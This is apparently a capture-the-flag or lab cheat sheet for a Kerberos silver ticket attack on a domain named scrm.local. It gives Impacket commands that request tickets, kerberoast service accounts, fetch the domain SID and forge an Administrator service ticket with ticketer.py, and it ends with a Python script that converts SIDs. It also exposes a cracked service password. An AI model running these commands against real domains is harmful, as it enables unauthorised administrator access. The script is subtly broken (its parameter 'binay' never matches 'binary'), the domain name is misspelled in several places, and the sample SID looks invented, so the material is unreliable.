# Silver Ticket Attack in Kerberos

- With valid credentials:
```bash
python3 getTGT.py scrm.local/ksimpson:ksimpson 
```

- Saved ticket should be exported to KRB5CCNAME
- Find valid user SPNs:
```bash
python3 GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -request
```

- We now have Service Prinicpal Names for a MSSQL service and have requested a TGT
- Perform offline hash cracking for the service password. 
This alone does not work for logging into the MSSQL database. 
A TGS is required. First obtain the service's TGT.
```bash
python3 getTGT.py scrm.local/sqlsvc:Pegasus60
export KRB5CCNAME=mssqlsvc.ccache
```

- Generate an NTLM hash for the service username using on online tool.
- Convert to lowercase, just to be safe. It could potentially be case sensitive.
- Obtain domain SID. This can be obtained from any user:
```bash
python3 getPac.py -targetUser administrator srcm.local/ksimpson:ksimpson
```

- Forge the TGS:
```bash
python3 ticketer.py -spn <svc_name> -user-id 500 Administrator -nthash <svc_hash> -domain-sid <domain_sid> -domain srcm.local
```
- We now have an administrator ccache

- Alternatively, to obtain the domain SID using LDAP:
```bash
ldapsearch -H ldap://dc1.srcm.local -U ksimpson -b 'DC=SCRM,DC=LOCAL' | grep -i sid

objectSid:: AFEFFFDAAAADAFAFASED398ya67x==
```

- LDAP uses it's own formatting so we need to convert it (binary to string):
```py
import struct
import base64
import sys

def convert(binay):
  version = struct.unpack('B', binary[0:1])[0]
  assert version == 1, version
  length = struct.unpack('B', binary[1:2])[0]
  authority = struct.unpack(b'>Q', b'\x00\x00' + binary[2:8])[0]
  string = 'S-%d-%d' % (version, authority)
  
  binary = binary[8:]
  assert len(binary) == 4 * length
  
  for i in range(length):
    value = struct.unpack('<L', binary[4*i:4*(i+1)])[0]
    string += '-%d' % value
    
  return string
   
b64Sid=sys.argv[1]
sid=base64.b64decode(b64Sid)
print(convert(sid))
```


